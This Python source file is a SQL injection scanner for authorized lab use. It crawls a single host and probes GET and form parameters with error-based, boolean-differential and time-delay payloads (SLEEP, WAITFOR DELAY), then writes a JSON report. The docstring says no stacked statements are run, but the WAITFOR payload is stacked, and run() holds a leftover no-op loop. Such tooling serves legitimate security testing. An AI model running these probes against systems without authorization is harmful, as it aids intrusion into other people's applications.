
#!/usr/bin/env python3
"""
SQL Injection Scanner
Python 3 | Kali Linux | Authorized lab testing

Features:
- Same-host crawling
- GET and HTML form parameter discovery
- SQL error-based detection
- Boolean differential testing
- Bounded time-delay checks
- Threaded scanning and shared rate limiting
- JSON report and timestamped log

Does not extract database records, modify database contents,
or execute stacked SQL statements.
"""

import argparse
import json
import logging
import re
import threading
import time

from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, asdict
from datetime import datetime, timezone
from urllib.parse import (
    urljoin,
    urlparse,
    urlunparse,
    parse_qsl,
    urlencode,
)

import requests
from bs4 import BeautifulSoup


SQL_ERRORS = re.compile(
    r"SQL syntax.*(?:MySQL|MariaDB)|"
    r"mysql_fetch|mysqli_sql_exception|"
    r"PostgreSQL.*ERROR|pg_query\(|"
    r"SQLite/JDBCDriver|SQLite.Exception|"
    r"Microsoft SQL Server|ODBC SQL Server Driver|"
    r"ORA-\d{4,5}|Oracle error|"
    r"Unclosed quotation mark after the character string|"
    r"SQLSTATE\[\w+\]|"
    r"SQL syntax error|"
    r"quoted string not properly terminated",
    re.IGNORECASE,
)

SKIP_SCHEMES = {"mailto", "javascript", "data", "tel"}
SKIP_EXTENSIONS = (
    ".png", ".jpg", ".jpeg", ".gif", ".svg", ".webp",
    ".pdf", ".zip", ".gz", ".css", ".js", ".ico",
    ".woff", ".woff2", ".ttf", ".mp4", ".mp3",
)


@dataclass
class Finding:
    url: str
    method: str
    parameter: str
    category: str
    severity: str
    evidence: str
    payload: str
    confidence: str


class RateLimiter:
    """Thread-safe global request-start limiter."""

    def __init__(self, requests_per_second):
        self.interval = 1.0 / max(requests_per_second, 0.1)
        self.lock = threading.Lock()
        self.next_request = 0.0

    def wait(self):
        with self.lock:
            now = time.monotonic()
            scheduled = max(now, self.next_request)
            self.next_request = scheduled + self.interval

        delay = scheduled - time.monotonic()
        if delay > 0:
            time.sleep(delay)


class SQLInjectionScanner:
    def __init__(
        self,
        target,
        max_pages=30,
        workers=2,
        rate=1.0,
        timeout=6,
        max_delay=3,
    ):
        parsed = urlparse(target)

        if parsed.scheme not in ("http", "https") or not parsed.hostname:
            raise ValueError("Target must be a valid HTTP or HTTPS URL.")

        self.target = target.rstrip("/")
        self.origin = (
            parsed.scheme.lower(),
            parsed.hostname.lower(),
            parsed.port or (443 if parsed.scheme == "https" else 80),
        )
        self.max_pages = max(1, max_pages)
        self.workers = max(1, min(workers, 4))
        self.timeout = max(2, min(timeout, 15))
        self.max_delay = max(1, min(max_delay, 3))

        self.limiter = RateLimiter(rate)
        self.session_local = threading.local()
        self.visited = set()
        self.visited_lock = threading.Lock()
        self.findings = []
        self.findings_lock = threading.Lock()
        self.tasks = []
        self.tasks_lock = threading.Lock()

        self.logger = logging.getLogger("SQLScanner")

    def session(self):
        """One HTTP session per worker thread."""
        if not hasattr(self.session_local, "http"):
            http = requests.Session()
            http.headers.update({
                "User-Agent": "LabSQLScanner/1.0",
                "Accept": "text/html,application/xhtml+xml",
            })
            self.session_local.http = http
        return self.session_local.http

    def normalize_url(self, url):
        parsed = urlparse(url)
        return urlunparse((
            parsed.scheme.lower(),
            parsed.netloc.lower(),
            parsed.path or "/",
            parsed.params,
            parsed.query,
            "",
        ))

    def in_scope(self, url):
        p = urlparse(url)

        if p.scheme not in ("http", "https"):
            return False

        port = p.port or (443 if p.scheme == "https" else 80)
        identity = (p.scheme.lower(), (p.hostname or "").lower(), port)

        return identity == self.origin

    def request(self, method, url, **kwargs):
        self.limiter.wait()

        try:
            response = self.session().request(
                method,
                url,
                timeout=self.timeout,
                allow_redirects=True,
                verify=True,
                **kwargs,
            )
            return response
        except requests.RequestException as exc:
            self.logger.debug("%s %s failed: %s", method, url, exc)
            return None

    def add_task(self, method, url, params, data, parameter):
        task = {
            "method": method,
            "url": url,
            "params": params,
            "data": data,
            "parameter": parameter,
        }

        # Avoid duplicate parameter tests.
        signature = (
            method,
            url,
            tuple(sorted((params or {}).items())),
            tuple(sorted((data or {}).items())),
            parameter,
        )

        with self.tasks_lock:
            if not hasattr(self, "_task_signatures"):
                self._task_signatures = set()

            if signature not in self._task_signatures:
                self._task_signatures.add(signature)
                self.tasks.append(task)

    def discover(self, url, response):
        soup = BeautifulSoup(response.text, "html.parser")

        for anchor in soup.find_all("a", href=True):
            href = anchor["href"].strip()

            if not href or urlparse(href).scheme in SKIP_SCHEMES:
                continue

            absolute = self.normalize_url(urljoin(response.url, href))
            path = urlparse(absolute).path.lower()

            if (
                self.in_scope(absolute)
                and not path.endswith(SKIP_EXTENSIONS)
            ):
                self.enqueue_page(absolute)

        # Discover existing query-string parameters.
        parsed = urlparse(response.url)
        query_pairs = parse_qsl(parsed.query, keep_blank_values=True)

        if query_pairs:
            base_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path,
                parsed.params, "", "",
            ))

            for key, value in query_pairs:
                self.add_task(
                    "GET", base_url,
                    {k: v for k, v in query_pairs},
                    None, key,
                )

        # Discover HTML forms.
        for form in soup.find_all("form"):
            action = urljoin(response.url, form.get("action") or response.url)
            method = (form.get("method") or "GET").upper()

            if method not in ("GET", "POST") or not self.in_scope(action):
                continue

            fields = {}

            for element in form.find_all(["input", "textarea", "select"]):
                name = element.get("name")

                if not name or element.has_attr("disabled"):
                    continue

                tag = element.name
                field_type = element.get("type", "text").lower()

                if tag == "input" and field_type in (
                    "submit", "button", "reset", "file",
                    "image", "password",
                ):
                    continue

                if tag == "select":
                    option = element.find("option", selected=True)
                    fields[name] = (
                        option.get("value", option.text)
                        if option else ""
                    )
                elif tag == "textarea":
                    fields[name] = element.text
                else:
                    fields[name] = element.get("value", "")

            for name in fields:
                if method == "GET":
                    self.add_task(
                        "GET", action, dict(fields), None, name
                    )
                else:
                    self.add_task(
                        "POST", action, None, dict(fields), name
                    )

    def enqueue_page(self, url):
        url = self.normalize_url(url)

        with self.visited_lock:
            if url in self.visited or len(self.visited) >= self.max_pages:
                return
            self.visited.add(url)

        response = self.request("GET", url)

        if response is None or response.status_code >= 500:
            return

        content_type = response.headers.get("Content-Type", "")
        if "html" not in content_type.lower():
            return

        self.logger.info("Crawled %s [%s]", url, response.status_code)
        self.discover(url, response)

    @staticmethod
    def body_signature(response):
        """Normalize dynamic content before comparing responses."""
        soup = BeautifulSoup(response.text, "html.parser")

        for node in soup(["script", "style", "noscript"]):
            node.decompose()

        text = " ".join(soup.get_text(" ").split())
        text = re.sub(r"\b\d{10,13}\b", "<TIME>", text)
        return text[:100_000]

    def send_task(self, task, payload):
        params = dict(task["params"] or {})
        data = dict(task["data"] or {})
        parameter = task["parameter"]

        if task["method"] == "GET":
            params[parameter] = payload
            return self.request("GET", task["url"], params=params)

        data[parameter] = payload
        return self.request("POST", task["url"], data=data)

    def record(self, task, category, severity, evidence, payload,
               confidence="medium"):
        finding = Finding(
            url=task["url"],
            method=task["method"],
            parameter=task["parameter"],
            category=category,
            severity=severity,
            evidence=evidence[:500],
            payload=payload,
            confidence=confidence,
        )

        with self.findings_lock:
            identity = (
                finding.url, finding.method, finding.parameter,
                finding.category,
            )

            if not any(
                (f.url, f.method, f.parameter, f.category) == identity
                for f in self.findings
            ):
                self.findings.append(finding)
                self.logger.warning(
                    "FINDING %s %s parameter=%s type=%s confidence=%s",
                    finding.method, finding.url, finding.parameter,
                    finding.category, finding.confidence,
                )

    def test_parameter(self, task):
        parameter = task["parameter"]
        baseline = self.send_task(task, "LAB_BASELINE_7341")

        if baseline is None:
            return

        # 1. Error-based probes: syntax errors and quote handling.
        error_payloads = [
            "'",
            '"',
            "')",
            "'",
        ]

        for payload in error_payloads:
            response = self.send_task(task, payload)
            if response is None:
                continue

            match = SQL_ERRORS.search(response.text)

            if match:
                self.record(
                    task,
                    "SQL error disclosure",
                    "Medium",
                    "Database error signature: " + match.group(0),
                    payload,
                    "high",
                )
                break

        # 2. Boolean differential tests.
        # These are comparison probes, not database data extraction.
        boolean_pairs = [
            ("' AND '7341'='7341' -- ", "' AND '7341'='0000' -- "),
            (" AND 7341=7341 -- ", " AND 7341=0000 -- "),
        ]

        baseline_sig = self.body_signature(baseline)

        for true_payload, false_payload in boolean_pairs:
            true_response = self.send_task(task, true_payload)
            false_response = self.send_task(task, false_payload)

            if true_response is None or false_response is None:
                continue

            true_sig = self.body_signature(true_response)
            false_sig = self.body_signature(false_response)

            if (
                true_response.status_code == false_response.status_code
                and true_sig != false_sig
                and true_sig != baseline_sig
                and false_sig != baseline_sig
                and abs(len(true_sig) - len(false_sig)) >= 20
            ):
                self.record(
                    task,
                    "Boolean-based SQLi indicator",
                    "Medium",
                    (
                        f"True/false response lengths: "
                        f"{len(true_sig)}/{len(false_sig)}; "
                        f"HTTP status: {true_response.status_code}/"
                        f"{false_response.status_code}"
                    ),
                    true_payload + " | " + false_payload,
                    "medium",
                )
                break

        # 3. Bounded time-delay checks.
        # Only short delays; requires repeated baseline comparison.
        delay_payloads = [
            f"' AND SLEEP({self.max_delay}) -- ",
            f"'; WAITFOR DELAY '0:0:{self.max_delay}' -- ",
        ]

        baseline_times = []
        for _ in range(2):
            start = time.monotonic()
            response = self.send_task(task, "LAB_TIMING_7341")
            if response is not None:
                baseline_times.append(time.monotonic() - start)

        if not baseline_times:
            return

        baseline_time = sorted(baseline_times)[len(baseline_times) // 2]

        for payload in delay_payloads:
            start = time.monotonic()
            response = self.send_task(task, payload)
            elapsed = time.monotonic() - start

            if response is None:
                continue

            # This is only an indicator; network latency can be noisy.
            if (
                elapsed >= self.max_delay
                and elapsed - baseline_time >= self.max_delay - 0.5
            ):
                self.record(
                    task,
                    "Time-delay SQLi indicator",
                    "Medium",
                    (
                        f"Probe took {elapsed:.2f}s; "
                        f"baseline median {baseline_time:.2f}s"
                    ),
                    payload,
                    "medium",
                )
                break

    def run(self):
        self.logger.info("Target: %s", self.target)
        self.logger.info("Max pages: %d", self.max_pages)
        self.logger.info(
            "Workers: %d | timeout: %ds",
            self.workers, self.timeout,
        )

        self.enqueue_page(self.target)

        # Crawl newly discovered pages, bounded by max_pages.
        while True:
            with self.visited_lock:
                remaining = self.max_pages - len(self.visited)
                pending = [
                    task_url for task_url in []
                ]

            # Page URLs are discovered and enqueued immediately.
            # Form and query tasks are collected by discover().
            break

        self.logger.info(
            "Discovered %d unique parameter tests across %d pages",
            len(self.tasks), len(self.visited),
        )

        with ThreadPoolExecutor(max_workers=self.workers) as executor:
            futures = [
                executor.submit(self.test_parameter, task)
                for task in self.tasks
            ]

            for future in as_completed(futures):
                try:
                    future.result()
                except Exception:
                    self.logger.exception("Parameter test failed")

        self.write_report()
        return self.findings

    def write_report(self):
        report = {
            "target": self.target,
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "pages_crawled": len(self.visited),
            "parameter_tests": len(self.tasks),
            "finding_count": len(self.findings),
            "findings": [asdict(f) for f in self.findings],
        }

        with open("sql_report.json", "w", encoding="utf-8") as file:
            json.dump(report, file, indent=2)

        self.logger.info("Report written to sql_report.json")


def main():
    parser = argparse.ArgumentParser(
        description="OOP SQL injection scanner for isolated web labs."
    )
    parser.add_argument(
        "--target",
        default="http://192.168.163.128/",
        help="Target URL, including application path if needed.",
    )
    parser.add_argument("--max-pages", type=int, default=30)
    parser.add_argument("--workers", type=int, default=2)
    parser.add_argument("--rate", type=float, default=1.0,
                        help="Maximum aggregate request starts per second.")
    parser.add_argument("--timeout", type=int, default=6)
    parser.add_argument("--delay", type=int, default=3,
                        choices=[1, 2, 3])

    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(message)s",
        handlers=[
            logging.StreamHandler(),
            logging.FileHandler("sql_scanner.log", encoding="utf-8"),
        ],
    )

    scanner = SQLInjectionScanner(
        target=args.target,
        max_pages=args.max_pages,
        workers=args.workers,
        rate=args.rate,
        timeout=args.timeout,
        max_delay=args.delay,
    )

    findings = scanner.run()

    print("\n========== SCAN SUMMARY ==========")
    print(f"Target: {args.target}")
    print(f"Pages crawled: {len(scanner.visited)}")
    print(f"Parameter tests: {len(scanner.tasks)}")
    print(f"Findings: {len(findings)}")

    for number, finding in enumerate(findings, start=1):
        print(
            f"\n[{number}] {finding.severity} — {finding.category}\n"
            f"URL: {finding.url}\n"
            f"Method: {finding.method}\n"
            f"Parameter: {finding.parameter}\n"
            f"Confidence: {finding.confidence}\n"
            f"Evidence: {finding.evidence}\n"
            f"Payload: {finding.payload}"
        )

    print("\nReports: sql_report.json, sql_scanner.log")


if __name__ == "__main__":
    main()
